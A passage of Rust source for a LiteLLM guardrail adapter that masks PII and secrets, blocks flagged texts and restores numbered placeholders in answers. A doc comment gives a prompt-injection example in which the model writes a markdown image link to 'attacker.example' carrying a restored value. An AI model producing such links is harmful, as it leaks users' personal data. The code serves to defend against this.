//! LiteLLM Generic Guardrail API adapter: `POST
//! /beta/litellm_basic_guardrail_api`.
//!
//! A LiteLLM proxy configured with `guardrail: generic_guardrail_api` and
//! `api_base` pointing at this server posts every guarded call here
//! (contract read from LiteLLM v1.110.2,
//! `litellm/proxy/guardrails/guardrail_hooks/generic_guardrail_api/` and
//! `litellm/types/proxy/guardrails/guardrail_hooks/generic_guardrail_api.py`):
//!
//! - request: `{"texts": [...], "input_type": "request" | "response",
//!   "structured_messages"?, "tool_calls"?, "litellm_call_id"?,
//!   "additional_provider_specific_params"?, ...}`. `images`, `tools`,
//!   `request_data`, `request_headers`, `litellm_trace_id`,
//!   `litellm_version` and `model` are accepted and ignored (never logged);
//! - response: `{"action": "NONE"}`, `{"action": "GUARDRAIL_INTERVENED",
//!   "texts": [...]}` (one text per request text, same order) or
//!   `{"action": "BLOCKED", "blocked_reason": "..."}`.
//!
//! Decision mapping (one [`Guard::sanitize`](crate::policy::Guard::sanitize)
//! per text, the per-item core of `/v1/batch/sanitize`, each audited with
//! the call id):
//! - any `Block` (a text, or the arguments of a tool call) is `BLOCKED`;
//!   the reason names the position and the static signal or category
//!   label, never request content. Evaluation stops at the first Block;
//! - otherwise, when any sanitized text differs from its input (PII or a
//!   secret masked, an unscannable line replaced), `GUARDRAIL_INTERVENED`
//!   with every text, changed or not, in request order;
//! - otherwise `NONE` (LiteLLM keeps its own texts).
//!
//! Targets: `input_type: "response"` is model output. `"request"` texts are
//! user prompts, except the texts of `tool` / `function` messages, which
//! are tool responses (the stricter lines): the role of each text comes
//! from `structured_messages`, walked with LiteLLM's own extraction rule
//! (a string `content` is one text, every list item with a `text` key is
//! one text). When that walk does not yield exactly one role per text, all
//! texts are user prompts.
//!
//! Model output is decided as `model_output` but NOT HTML-encoded by
//! default: LiteLLM hands the text to an API client, not to an HTML page,
//! and the encoding rewrites every quote and apostrophe, which would turn
//! almost every answer into an intervention. `"html_encode": true` in
//! `additional_provider_specific_params` restores the `/v1/sanitize`
//! rendering.
//!
//! Streaming: a `"response"` answer also carries `stream_holdback_chars`,
//! per text the characters after its last line break. LiteLLM's
//! `streaming_transform_mode: incremental_diff` re-sends the accumulated
//! answer every few chunks and streams only the part of the returned text
//! past what it already sent, minus that holdback, so the client receives
//! whole lines, masked (the line model of the streaming guard). The final
//! round flushes the rest. Without the holdback, a value masked after its
//! first digits streamed could not be rewritten and LiteLLM ends the
//! stream with `stream_transform_underflow`. Non-streaming calls and the
//! default `block_only` mode ignore the field (in `block_only` LiteLLM
//! drops rewrites and only a Block takes effect).
//!
//! `additional_provider_specific_params` may carry only options that add
//! detection (`words`, `words_ignore_case`, `patterns` with `pattern` and
//! `cues` only: no `label`, no `score`) plus `html_encode`. Client rules run
//! after the built-in masking, on its output, so they add masks
//! (`[CUSTOM_PATTERN]`, `[CUSTOM_WORD]`) but can never displace or split a
//! built-in entity.
//! LiteLLM merges a client's per-request `extra_body` over the configured
//! params, so an option that narrows detection (`ignore`, `locales`, a mask
//! that keeps characters visible) would let a client switch masking off;
//! those belong in the server policy (`REDACTIFY_POLICY`). Any other key is
//! a 400, which LiteLLM treats as a failed check (fail-closed by default).
//!
//! Restoration ([`RestoreSessions`], off by default). Verified against
//! LiteLLM v1.110.2: the generic guardrail sends
//! `logging_obj.litellm_call_id` on every call
//! (`generic_guardrail_api.py` `apply_guardrail`), the proxy keeps one
//! logging object per call from the pre_call hook to the post_call and
//! streaming hooks (`common_request_processing.py`), and the streaming
//! rounds re-send the accumulated answer (`handler.py`
//! `_process_streaming_transform`). So the request side stores the call's
//! vault under its call id and the response side restores with it:
//! - the request side renders every PII region as a numbered placeholder
//!   (`[TCKN_1]`; same value, same placeholder across the call's texts)
//!   instead of a label; secrets keep `[SECRET:...]` and never enter the
//!   vault. Numbering is the vault's own pass: a number whose placeholder
//!   the request already contains in any shape the tolerant restore
//!   accepts (`<TCKN_1>`, bare `TCKN_1`, `[tckn_01]`) is skipped, and the
//!   vault's round-trip exemptions are kept in the session. It never
//!   returns an original;
//! - the response side masks new PII in the answer like any response, then
//!   restores the call's placeholders (tolerantly, as far as the call's
//!   own texts allow), except in a URL context: a URL as the egress
//!   scanner reads it (WHATWG special schemes: `\` as `/`, `https:host`),
//!   an HTML tag, a markdown link destination, or a word with a URL
//!   marker (see `protected_ranges`), where a restored value could leave
//!   through a prompt-injected image or link. The holdback covers the unfinished
//!   input line, so a placeholder split across streaming chunks is never
//!   released half-way;
//! - LiteLLM takes the call id from the client's `x-litellm-call-id`
//!   header when one is sent (`resolve_litellm_call_id`), so a client
//!   could name another call's id. That header reaches this endpoint in
//!   `request_headers`; a call that carries it (or that has no
//!   `request_headers`) gets no session: labels, no restoration. An id
//!   LiteLLM generated is a random UUIDv4 that only the caller sees (the
//!   `x-litellm-call-id` response header). Sessions are also bound to
//!   `request_data.user_api_key_hash`;
//! - a missing, expired or full session fails safe: the request side masks
//!   with labels, the response side leaves the placeholders in place. The
//!   protocol does not mark a call's last response round, so a session
//!   ends when the answer is blocked, or
//!   [`RestoreLimits::linger_after_response`] after its last
//!   response-side use.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use super::{err, ok, ApiResponse, ApiState, BearerToken, Handled, RequestExtras};
use crate::policy::{Decision, Detector, Guard, GuardAction, GuardTarget, MaskStyle};
use crate::{EntityType, PseudonymKey, RestoreOptions, Vault};

/// The path LiteLLM appends to the configured `api_base`.
pub(super) const PATH: &str = "/beta/litellm_basic_guardrail_api";

/// The header LiteLLM sends the configured `api_key` in.
const API_KEY_HEADER: &str = "x-api-key";

/// The keys accepted in `additional_provider_specific_params`.
const PROVIDER_PARAM_KEYS: &[&str] = &[
    "words",
    "words_ignore_case",
    "patterns",
    "html_encode",
    "restore",
];

/// `POST /beta/litellm_basic_guardrail_api`.
pub(super) fn handle(state: &ApiState, v: &serde_json::Value) -> Handled {
    let response_side = match v.get("input_type").and_then(serde_json::Value::as_str) {
        Some("request") => false,
        Some("response") => true,
        _ => {
            return Err(err(
                400,
                "bad_input_type",
                "`input_type` must be \"request\" or \"response\"",
            ))
        }
    };
    let texts = texts_from(v)?;
    let tool_calls = tool_call_arguments(v)?;
    let params = ProviderParams::from_request(v)?;
    // restoration: on when the server enables it and this guardrail does
    // not opt out; a session exists only for a call LiteLLM identified
    let sessions = match (params.restore, state.litellm_restore.as_deref()) {
        (Some(true), None) => {
            return Err(err(
                400,
                "bad_provider_params",
                "`restore` is not enabled on this server (see REDACTIFY_LITELLM_RESTORE)",
            ))
        }
        (Some(false), _) | (None, None) => None,
        (_, Some(sessions)) => Some(sessions),
    };
    let session = sessions.and_then(|s| session_key(v).map(|key| (s, key)));
    let rules = params.extras.rule_refs();
    let request_id = call_id(v);
    let ner = state.ner_slice();
    // built-in detection never sees the client rules: they run afterwards,
    // on the masked text, so they can only add masks (see `ClientRules`)
    let guard = |target| state.guard(target, &[], &ner, &[], &[]);
    let client_guard = (!rules.is_empty()).then(|| {
        state
            .guard(GuardTarget::UserPrompt, &[], &[], &[], &[])
            .with_custom_rules(&rules)
    });
    let client = client_guard
        .as_ref()
        .map(|g| ClientRules(g.detector().with_normalization(true)));
    let add_client_masks = |text: String, protected: &[(usize, usize)]| match &client {
        Some(c) => c.mask(text, protected),
        None => text,
    };

    let mut out: Vec<String> = Vec::with_capacity(texts.len());
    let mut changed = false;
    // response side: per returned text, the characters of its unfinished
    // last line (see the module docs on streaming)
    let mut holdback: Vec<usize> = Vec::new();
    if response_side {
        holdback.reserve_exact(texts.len());
        // the vault of this call's request side, when it has one: a copy,
        // so the restore automaton built for this call is not kept
        let vault = session
            .as_ref()
            .and_then(|(s, key)| s.vault_for_response(key, Instant::now()))
            .map(|stored| (stored.vault.clone(), stored.opts));
        // decided as model output; rendered by a non-HTML guard of the
        // same configuration unless HTML encoding was asked for (the
        // detector and the masking do not depend on the target)
        let model = guard(GuardTarget::ModelOutput);
        let plain = guard(GuardTarget::UserPrompt);
        for (i, text) in texts.iter().enumerate() {
            let decision = model.decide(text);
            state.emit_audit(request_id, &decision);
            if decision.action == GuardAction::Block {
                if let Some((s, key)) = &session {
                    s.end_key(key);
                }
                return Ok(blocked("texts", i, &decision));
            }
            let renderer = if params.html_encode { &model } else { &plain };
            let sanitized = renderer.sanitize_with_decision(text, decision).text;
            let (returned, held) = match &vault {
                Some((vault, opts)) => {
                    let protected = placeholder_ranges(&sanitized, vault);
                    restore_by_line(vault, *opts, &add_client_masks(sanitized, &protected))
                }
                None => {
                    let masked = add_client_masks(sanitized, &[]);
                    let held = unfinished_line_chars(&masked);
                    (masked, held)
                }
            };
            changed |= returned != *text;
            holdback.push(held);
            out.push(returned);
        }
    } else {
        let targets = request_targets(v, texts.len());
        let is_tool = |i: usize| {
            matches!(
                targets.as_ref().map(|t| t[i]),
                Some(GuardTarget::ToolResponse)
            )
        };
        // sanitizes every text with the guard of its role and audits each
        // decision; the first Block answers the call
        let sanitize_each = |user: &Guard<'_>, tool: &Guard<'_>| {
            let mut sanitized = Vec::with_capacity(texts.len());
            for (i, text) in texts.iter().enumerate() {
                let r = if is_tool(i) {
                    tool.sanitize(text)
                } else {
                    user.sanitize(text)
                };
                state.emit_audit(request_id, &r.decision);
                if r.decision.action == GuardAction::Block {
                    return Err(blocked("texts", i, &r.decision));
                }
                sanitized.push(r.text);
            }
            Ok(sanitized)
        };
        match &session {
            Some((sessions, key)) => {
                // masked with the internal pseudonym style, so every PII
                // region can be tied back to its original (see
                // `masked_regions`), then numbered by the vault
                let style = sessions.style();
                let user = guard(GuardTarget::UserPrompt).with_mask_style(style.clone());
                let tool = guard(GuardTarget::ToolResponse).with_mask_style(style.clone());
                let sanitized = match sanitize_each(&user, &tool) {
                    Ok(sanitized) => sanitized,
                    Err(answer) => return Ok(answer),
                };
                let regions: Vec<_> = sanitized
                    .iter()
                    .zip(&texts)
                    .enumerate()
                    .map(|(i, (s, text))| {
                        let g = if is_tool(i) { &tool } else { &user };
                        masked_regions(s, text, g, style)
                    })
                    .collect();
                let call = CallVault::build(&texts, &regions, sessions.limits());
                let render = |call: Option<&CallVault>, i: usize| {
                    let (numbered, protected) = match call {
                        Some(c) => c.render(&sanitized[i], texts[i], &regions[i]),
                        None => render_regions(&sanitized[i], &regions[i], |_| None),
                    };
                    add_client_masks(numbered, &protected)
                };
                let mut rendered: Vec<String> =
                    (0..texts.len()).map(|i| render(call.as_ref(), i)).collect();
                if let Some(call) = call {
                    let opts = call.options_for(&rendered);
                    let now = Instant::now();
                    let base = sessions.snapshot(key, now);
                    // a repeated request-side call (a retry) must keep the
                    // numbering the session already handed out
                    let consistent = base.as_ref().map_or(true, |(b, _)| {
                        b.vault
                            .entries_iter()
                            .all(|(p, o)| call.vault.original_for(p) == Some(o.as_str()))
                    });
                    let stored = consistent
                        && sessions.store(
                            key,
                            Arc::new(SessionVault {
                                vault: call.vault,
                                opts,
                            }),
                            base.map(|(_, version)| version),
                            now,
                        );
                    if !stored {
                        // no session: nothing could restore these
                        // placeholders, so they are rendered as labels
                        rendered = (0..texts.len()).map(|i| render(None, i)).collect();
                    }
                }
                for (text, masked) in texts.iter().zip(rendered) {
                    changed |= masked != *text;
                    out.push(masked);
                }
            }
            None => {
                let user = guard(GuardTarget::UserPrompt);
                let tool = guard(GuardTarget::ToolResponse);
                let sanitized = match sanitize_each(&user, &tool) {
                    Ok(sanitized) => sanitized,
                    Err(answer) => return Ok(answer),
                };
                for (text, sanitized) in texts.iter().zip(sanitized) {
                    let masked = add_client_masks(sanitized, &[]);
                    changed |= masked != *text;
                    out.push(masked);
                }
            }
        }
    }

    // tool-call arguments are model-generated and LiteLLM does not take
    // rewritten tool calls back from this API: only a Block applies
    if !tool_calls.is_empty() {
        let model = guard(GuardTarget::ModelOutput);
        for (i, args) in tool_calls.iter().enumerate() {
            let decision = model.decide(args);
            state.emit_audit(request_id, &decision);
            if decision.action == GuardAction::Block {
                return Ok(blocked("tool_calls", i, &decision));
            }
        }
    }

    let mut body = if changed {
        serde_json::json!({ "action": "GUARDRAIL_INTERVENED", "texts": out })
    } else {
        serde_json::json!({ "action": "NONE" })
    };
    if holdback.iter().any(|&n| n > 0) {
        body["stream_holdback_chars"] = holdback.into();
    }
    Ok(ok(body))
}

/// The characters (code points, LiteLLM counts Python `str` length) after
/// the last line break of `text`: all of it when it holds none.
fn unfinished_line_chars(text: &str) -> usize {
    text.rfind('\n')
        .map_or(text, |i| &text[i + 1..])
        .chars()
        .count()
}

// ---------------------------------------------------------------------------
// Response-side restoration
// ---------------------------------------------------------------------------

/// The inbound header a LiteLLM client sets to choose the call id itself
/// (LiteLLM v1.110.2 `common_request_processing.py`
/// `resolve_litellm_call_id`); LiteLLM forwards it to the guardrail in
/// `request_headers` (the `x-litellm-*` allowlist).
const CLIENT_CALL_ID_HEADER: &str = "x-litellm-call-id";

/// The longest `request_data.user_api_key_hash` a session is bound to.
const MAX_PRINCIPAL_LEN: usize = 512;

/// The session key of a call, or `None` when the call cannot hold a
/// restore session:
/// - `litellm_call_id` must pass the audit request-id rule;
/// - `request_headers` must be present and must not carry
///   `x-litellm-call-id`: an id the client chose could be another call's
///   id, and the session would hand that call's originals to this client.
///   An id LiteLLM generated is a random UUIDv4 the client did not pick;
/// - the session is also bound to `request_data.user_api_key_hash` (the
///   LiteLLM key the call was authenticated with), so another key's call
///   with the same id never finds it.
fn session_key(v: &serde_json::Value) -> Option<Box<str>> {
    let id = call_id(v)?;
    let headers = v.get("request_headers")?.as_object()?;
    if headers
        .keys()
        .any(|k| k.eq_ignore_ascii_case(CLIENT_CALL_ID_HEADER))
    {
        return None;
    }
    let principal = match v
        .get("request_data")
        .and_then(|d| d.get("user_api_key_hash"))
    {
        None | Some(serde_json::Value::Null) => "",
        Some(serde_json::Value::String(s)) if s.len() <= MAX_PRINCIPAL_LEN => s.as_str(),
        Some(_) => return None,
    };
    Some(join_key(id, principal))
}

/// `principal NUL call_id`. The call id is printable ASCII (no NUL), so
/// the key splits at its last NUL: distinct pairs give distinct keys.
fn join_key(call_id: &str, principal: &str) -> Box<str> {
    let mut key = String::with_capacity(principal.len() + 1 + call_id.len());
    key.push_str(principal);
    key.push('\0');
    key.push_str(call_id);
    key.into_boxed_str()
}

/// The byte ranges of the exact vault placeholders (`[TCKN_1]`) in `text`.
fn placeholder_ranges(text: &str, vault: &Vault) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(open) = text[from..].find('[').map(|i| from + i) {
        let inner_start = open + 1;
        match text[inner_start..]
            .find([']', '['])
            .map(|i| inner_start + i)
        {
            Some(close) if text.as_bytes()[close] == b']' => {
                if vault.original_for(&text[inner_start..close]).is_some() {
                    out.push((open, close + 1));
                }
                from = close + 1;
            }
            Some(next_open) => from = next_open,
            None => break,
        }
    }
    out
}

/// A call's stored vault and the restore options its own request texts
/// allow (see [`CallVault::build`]).
struct SessionVault {
    vault: Vault,
    opts: RestoreOptions,
}

/// Restores `masked` and returns it with its holdback: the characters of
/// the restored last line. Placeholders inside a URL context
/// ([`protected_ranges`]) are not restored. The whole text is restored in
/// one pass, so the vault's code context (a fenced block, an inline code
/// span, where a bare `PHONE_1` is an identifier and stays) runs from the
/// start of the answer through protected ranges and line breaks alike. A
/// streaming round re-sends the whole accumulated answer, so every round
/// recomputes that context from the start. The holdback is measured from
/// the output position of the last input line break (a restored original
/// may itself contain a line break, which must not shorten it).
fn restore_by_line(vault: &Vault, opts: RestoreOptions, masked: &str) -> (String, usize) {
    let protected = protected_ranges(masked);
    let split = masked.rfind('\n').map_or(0, |i| i + 1);
    let (out, mark) = vault.restore_skipping(masked, opts, &protected, split);
    let held = out[mark..].chars().count();
    (out, held)
}

/// The byte ranges of `text` where a restored value could leave the
/// client in a request (a prompt injection makes the model write
/// `![](https:\\attacker.example\?q=[TCKN_1])`, and the renderer fetches
/// it). The union of, all widened to whole whitespace-separated words:
/// - every URL the egress scanner finds
///   ([`EgressAllowlist::filter`](crate::guard::egress::EgressAllowlist::filter)
///   with an empty allowlist): the WHATWG reading of the special schemes
///   (`\` as `/`, `https:host`, `https:/host`), protocol-relative `//host`
///   and `\\host` in link positions, `www.` autolinks, character
///   references, tab and line-break removal, quoted HTML attribute values
///   across lines; the span on each line runs from the first to the last
///   change the filter made there, plus the length of its marker on both
///   sides;
/// - every HTML tag, `<` + letter, `/`, `!` or `?` up to the `>` outside
///   quotes (to the end of the text when unclosed), except a lone
///   placeholder rendering such as `<TCKN_1>`;
/// - every markdown link destination, `](` up to its balanced `)` (to the
///   end of the text when unclosed, also across lines), and every
///   reference definition `]:` to the end of its line;
/// - every word holding `//`, `\\`, `/\`, `\/`, `www.`, a colon right
///   after a letter or `;` (a scheme, also `&#104;ttps:`), or an encoded
///   colon (`&colon;`, `&#58`, `&#x3a`).
///
/// Every region starts at an opener and only grows as text is appended,
/// so a streamed line released in one round is protected the same way in
/// every later round.
fn protected_ranges(text: &str) -> Vec<(usize, usize)> {
    let mut ranges = Vec::new();
    egress_ranges(text, &mut ranges);
    tag_ranges(text, &mut ranges);
    destination_ranges(text, &mut ranges);
    marked_word_ranges(text, &mut ranges);
    if ranges.is_empty() {
        return ranges;
    }
    let b = text.as_bytes();
    for r in &mut ranges {
        // whole words: a rendering is never cut at a range edge
        while r.0 > 0 && !b[r.0 - 1].is_ascii_whitespace() {
            r.0 -= 1;
        }
        while r.1 < b.len() && !b[r.1].is_ascii_whitespace() {
            r.1 += 1;
        }
    }
    ranges.sort_unstable();
    let mut merged: Vec<(usize, usize)> = Vec::with_capacity(ranges.len());
    for (s, e) in ranges {
        match merged.last_mut() {
            Some(last) if s <= last.1 => last.1 = last.1.max(e),
            _ => merged.push((s, e)),
        }
    }
    merged
}

/// The URL spans of the egress scanner, per line (see [`protected_ranges`]).
fn egress_ranges(text: &str, out: &mut Vec<(usize, usize)>) {
    use crate::guard::egress::{EgressAllowlist, BLOCKED_URL};
    let Ok(deny_all) = EgressAllowlist::new(std::iter::empty::<&str>()) else {
        out.push((0, text.len()));
        return;
    };
    let filtered = deny_all.filter(text);
    if filtered.blocked == 0 {
        return;
    }
    let marker = BLOCKED_URL.len();
    let mut lines = text.split('\n');
    let mut filtered_lines = filtered.text.split('\n');
    let mut offset = 0;
    loop {
        match (lines.next(), filtered_lines.next()) {
            (Some(line), Some(f)) => {
                if line != f {
                    // the filter copies the text around its replacements:
                    // what precedes the first marker and follows the last
                    // one is the line's own (a marker the text itself
                    // holds only widens the span)
                    match (f.find(BLOCKED_URL), f.rfind(BLOCKED_URL)) {
                        (Some(first), Some(last)) => {
                            let tail = f.len() - (last + marker);
                            let start = first.min(line.len());
                            let end = line.len().saturating_sub(tail).max(start);
                            out.push((offset + start, offset + end));
                        }
                        _ => out.push((offset, offset + line.len())),
                    }
                }
                offset += line.len() + 1;
            }
            (None, None) => break,
            // the filter keeps the line structure; if it ever did not,
            // nothing is restored
            _ => {
                out.push((0, text.len()));
                break;
            }
        }
    }
}

/// HTML tags (see [`protected_ranges`]).
fn tag_ranges(text: &str, out: &mut Vec<(usize, usize)>) {
    let b = text.as_bytes();
    let mut i = 0;
    while i + 1 < b.len() {
        let opens = b[i] == b'<' && (b[i + 1].is_ascii_alphabetic() || b"/!?".contains(&b[i + 1]));
        if !opens {
            i += 1;
            continue;
        }
        let mut j = i + 1;
        let mut quote = None;
        while j < b.len() {
            match quote {
                Some(q) if b[j] == q => quote = None,
                Some(_) => {}
                None if b[j] == b'"' || b[j] == b'\'' => quote = Some(b[j]),
                None if b[j] == b'>' => break,
                None => {}
            }
            j += 1;
        }
        let end = (j + 1).min(b.len());
        if !is_placeholder_shaped(&text[i + 1..j.min(b.len())]) {
            out.push((i, end));
        }
        i = end;
    }
}

/// Whether the inside of `<...>` is a lone placeholder rendering
/// (`TCKN_1`, ` NAME_01 `): letters, digits and `_`, ending in `_` and
/// digits, at most two spaces around.
fn is_placeholder_shaped(inner: &str) -> bool {
    let trimmed = inner.trim_matches(' ');
    if inner.len() - trimmed.len() > 4 {
        return false;
    }
    let Some((label, digits)) = trimmed.rsplit_once('_') else {
        return false;
    };
    !label.is_empty()
        && !digits.is_empty()
        && digits.bytes().all(|d| d.is_ascii_digit())
        && label.chars().all(|c| c.is_alphanumeric() || c == '_')
}

/// Markdown link destinations and reference definitions (see
/// [`protected_ranges`]).
fn destination_ranges(text: &str, out: &mut Vec<(usize, usize)>) {
    let b = text.as_bytes();
    for (i, _) in text.match_indices("](") {
        let open = i + 1;
        let mut depth = 0usize;
        let mut j = open;
        let mut end = b.len();
        while j < b.len() {
            match b[j] {
                b'\\' => j += 1,
                b'(' => depth += 1,
                b')' => {
                    depth -= 1;
                    if depth == 0 {
                        end = j + 1;
                        break;
                    }
                }
                _ => {}
            }
            j += 1;
        }
        out.push((open, end.min(b.len())));
    }
    for (i, _) in text.match_indices("]:") {
        let end = text[i..].find('\n').map_or(text.len(), |n| i + n);
        out.push((i + 1, end));
    }
}

/// Words with a URL marker (see [`protected_ranges`]).
fn marked_word_ranges(text: &str, out: &mut Vec<(usize, usize)>) {
    let mut start = 0;
    for (i, c) in text
        .char_indices()
        .chain(std::iter::once((text.len(), ' ')))
    {
        if !c.is_ascii_whitespace() {
            continue;
        }
        if start < i && has_url_marker(&text[start..i]) {
            out.push((start, i));
        }
        start = i + c.len_utf8();
    }
}

fn has_url_marker(word: &str) -> bool {
    let b = word.as_bytes();
    let pairs = b.windows(2).any(|w| {
        matches!(
            w,
            [b'/', b'/'] | [b'\\', b'\\'] | [b'/', b'\\'] | [b'\\', b'/']
        )
    });
    let scheme_colon = b
        .windows(2)
        .any(|w| w[1] == b':' && (w[0].is_ascii_alphabetic() || w[0] == b';'));
    let lower = word.to_ascii_lowercase();
    pairs
        || scheme_colon
        || ["www.", "&colon;", "&#58", "&#x3a"]
            .iter()
            .any(|m| lower.contains(m))
}

/// One pseudonym of a sanitized request text (see [`masked_regions`]).
struct Region {
    /// Byte range of the `[TYPE#<16 hex>]` token in the sanitized text.
    token: (usize, usize),
    /// End of its type label.
    label_end: usize,
    /// What the token masks.
    origin: Origin,
}

enum Origin {
    /// The client wrote this pseudonym-shaped text itself.
    Literal,
    /// A region of the original text: byte range and entity type.
    Masked(usize, usize, EntityType),
    /// No detected entity matches (an encoded value, a region clipped by
    /// a secret): rendered as the plain label.
    Unmatched,
}

/// The pseudonyms of `sanitized` (the guard's rendering of `original` with
/// the session table's keyed pseudonym style), each tied to the region of
/// `original` it masks: the pseudonyms of the detected entities, alone and
/// as overlap groups (the union the masking renders as one region, typed
/// by its longest span), are recomputed and matched.
fn masked_regions(
    sanitized: &str,
    original: &str,
    guard: &Guard<'_>,
    style: &MaskStyle,
) -> Vec<Region> {
    let tokens = pseudonym_tokens(sanitized);
    if tokens.is_empty() {
        return Vec::new();
    }
    let candidates = pseudonym_candidates(original, guard, style);
    let literal: HashSet<&str> = pseudonym_tokens(original)
        .into_iter()
        .map(|(s, e, _)| &original[s..e])
        .collect();
    tokens
        .into_iter()
        .map(|(start, end, label_end)| {
            let token = &sanitized[start..end];
            let origin = if literal.contains(token) {
                Origin::Literal
            } else {
                match candidates.get(token) {
                    Some(&(s, e, kind)) => Origin::Masked(s, e, kind),
                    None => Origin::Unmatched,
                }
            };
            Region {
                token: (start, end),
                label_end,
                origin,
            }
        })
        .collect()
}

/// The vault of one request-side call.
///
/// Numbering, the skipping of numbers already written in the request (in
/// every shape the tolerant restore accepts: `<TCKN_1>`, bare `TCKN_1`,
/// `[tckn_01]`, translated labels) and the round-trip exemptions are the
/// vault's own (`Vault::pseudonymize_entities`, the pass behind
/// [`Vault::pseudonymize`]), run over the call's texts joined by line breaks
/// with exactly the regions the guard masked. The stored vault keeps its
/// exemptions (it is never rebuilt from entries). On top, the most
/// tolerant [`RestoreOptions`] under which restoring the call's own
/// numbered texts equals the exact-token restore is recorded for the
/// session, so even an echo the exemptions do not cover comes back as the
/// client wrote it.
struct CallVault {
    vault: Vault,
    /// Original -> placeholder (without brackets).
    placeholders: HashMap<String, String>,
}

impl CallVault {
    /// `None` when no region is numbered.
    fn build(texts: &[&str], regions: &[Vec<Region>], limits: RestoreLimits) -> Option<Self> {
        let mut joined = String::with_capacity(texts.iter().map(|t| t.len() + 1).sum());
        let mut entities = Vec::new();
        let mut kept: HashSet<&str> = HashSet::new();
        let mut bytes = 0usize;
        for (text, regions) in texts.iter().zip(regions) {
            let offset = joined.len();
            joined.push_str(text);
            joined.push('\n');
            for r in regions {
                let Origin::Masked(s, e, kind) = r.origin else {
                    continue;
                };
                let value = &text[s..e];
                if !kept.contains(value) {
                    // a placeholder is the label, `_` and a short number
                    let cost = value.len() + kind.as_str().len() + 4;
                    if kept.len() >= limits.max_entries || bytes + cost > limits.max_bytes {
                        continue;
                    }
                    bytes += cost;
                    kept.insert(value);
                }
                entities.push(crate::Entity {
                    kind,
                    start: offset + s,
                    end: offset + e,
                    text: String::new(),
                    score: 1.0,
                });
            }
        }
        if entities.is_empty() {
            return None;
        }
        let (_, vault) = Vault::pseudonymize_entities(&joined, &entities);
        let placeholders = vault
            .entries_iter()
            .map(|(p, o)| (o.clone(), p.clone()))
            .collect();
        Some(Self {
            vault,
            placeholders,
        })
    }

    /// `sanitized` with its pseudonyms rendered: a numbered region as its
    /// placeholder, a client-written one verbatim, any other as its plain
    /// label. Returns the byte ranges of the placeholders written.
    fn render(
        &self,
        sanitized: &str,
        original: &str,
        regions: &[Region],
    ) -> (String, Vec<(usize, usize)>) {
        render_regions(sanitized, regions, |r| match r.origin {
            Origin::Masked(s, e, _) => self.placeholders.get(&original[s..e]).map(String::as_str),
            _ => None,
        })
    }

    /// The most tolerant options under which restoring every one of
    /// `numbered` (the call's texts as the model sees them) gives the
    /// exact-token restore. Run on a copy, so the stored vault holds no
    /// restore automaton.
    fn options_for(&self, numbered: &[String]) -> RestoreOptions {
        let probe = self.vault.clone();
        let strict: Vec<String> = numbered
            .iter()
            .map(|t| restore_by_line(&probe, RestoreOptions::STRICT, t).0)
            .collect();
        [
            RestoreOptions::TOLERANT,
            RestoreOptions::TOLERANT.with_suffix_repair(false),
            RestoreOptions::TOLERANT.with_altered_forms(false),
        ]
        .into_iter()
        .find(|&opts| {
            numbered
                .iter()
                .zip(&strict)
                .all(|(t, s)| restore_by_line(&probe, opts, t).0 == *s)
        })
        .unwrap_or(RestoreOptions::STRICT)
    }
}

/// Renders the pseudonyms of `sanitized`: `numbered(region)` gives the
/// placeholder of a numbered region; a literal one is copied; any other
/// becomes `[LABEL]`.
fn render_regions<'p>(
    sanitized: &str,
    regions: &[Region],
    numbered: impl Fn(&Region) -> Option<&'p str>,
) -> (String, Vec<(usize, usize)>) {
    let mut out = String::with_capacity(sanitized.len());
    let mut protected = Vec::new();
    let mut last = 0;
    for r in regions {
        let (start, end) = r.token;
        out.push_str(&sanitized[last..start]);
        last = end;
        if matches!(r.origin, Origin::Literal) {
            out.push_str(&sanitized[start..end]);
            continue;
        }
        out.push('[');
        match numbered(r) {
            Some(placeholder) => {
                let at = out.len() - 1;
                out.push_str(placeholder);
                out.push(']');
                protected.push((at, out.len()));
            }
            None => {
                out.push_str(&sanitized[start + 1..r.label_end]);
                out.push(']');
            }
        }
    }
    out.push_str(&sanitized[last..]);
    (out, protected)
}

/// The `[TYPE#<16 lowercase hex>]` tokens of `text`, as `(start, end,
/// label end)` byte offsets.
fn pseudonym_tokens(text: &str) -> Vec<(usize, usize, usize)> {
    const MAX_LABEL: usize = 64;
    const HEX: usize = 16;
    let bytes = text.as_bytes();
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(start) = text[from..].find('[').map(|i| from + i) {
        from = start + 1;
        let label_len = bytes[from..]
            .iter()
            .take(MAX_LABEL + 1)
            .position(|&b| b == b'#' || b == b'[' || b == b']' || b.is_ascii_whitespace());
        let Some(label_len) = label_len.filter(|&n| n > 0 && bytes[from + n] == b'#') else {
            continue;
        };
        let label_end = from + label_len;
        let hex = label_end + 1;
        let close = hex + HEX;
        if close < bytes.len()
            && bytes[hex..close]
                .iter()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(b))
            && bytes[close] == b']'
        {
            out.push((start, close + 1, label_end));
            from = close + 1;
        }
    }
    out
}

/// Pseudonym -> (region start, end, type) for every entity the guard's
/// detector finds in `original`, alone and as an overlap group.
fn pseudonym_candidates(
    original: &str,
    guard: &Guard<'_>,
    style: &MaskStyle,
) -> HashMap<String, (usize, usize, EntityType)> {
    let mut entities = guard.detector().with_normalization(true).detect(original);
    entities.sort_by_key(|e| e.start);
    let render = |start: usize, end: usize, group: &[crate::Entity]| -> Option<String> {
        let region = original.get(start..end)?;
        let shifted: Vec<crate::Entity> = group
            .iter()
            .map(|e| crate::Entity {
                kind: e.kind,
                start: e.start - start,
                end: e.end - start,
                text: String::new(),
                score: e.score,
            })
            .collect();
        Some(style.redact(region, &shifted))
    };
    let mut out = HashMap::with_capacity(entities.len());
    let mut i = 0;
    while i < entities.len() {
        // the overlap group of entities[i] (same rule as the masking:
        // spans that start before the group's end join it)
        let start = entities[i].start;
        let mut end = entities[i].end;
        let mut j = i + 1;
        while j < entities.len() && entities[j].start < end {
            end = end.max(entities[j].end);
            j += 1;
        }
        for e in &entities[i..j] {
            if let Some(token) = render(e.start, e.end, std::slice::from_ref(e)) {
                out.entry(token).or_insert((e.start, e.end, e.kind));
            }
        }
        if j - i > 1 {
            if let Some(token) = render(start, end, &entities[i..j]) {
                // the group takes the type its rendering names
                let kind = entities[i..j].iter().map(|e| e.kind).find(|k| {
                    token[1..].starts_with(k.as_str())
                        && token.as_bytes().get(k.as_str().len() + 1) == Some(&b'#')
                });
                if let Some(kind) = kind {
